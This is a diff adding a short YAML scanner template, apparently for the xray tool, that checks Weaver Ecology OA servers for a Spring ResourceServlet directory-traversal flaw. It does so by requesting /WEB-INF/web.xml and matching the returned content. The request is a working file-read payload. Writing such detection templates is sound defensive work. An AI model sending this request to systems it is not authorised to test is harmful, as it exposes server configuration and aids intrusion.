@@ -1,0 +1,19 @@
+id: ecology-springframework-directory-traversal
+
+info:
+    name: ecology-springframework-directory-traversal
+    author: l1nk3r
+    severity: high
+
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(b"<url-pattern>/weaver/")
+expression: r0()
+
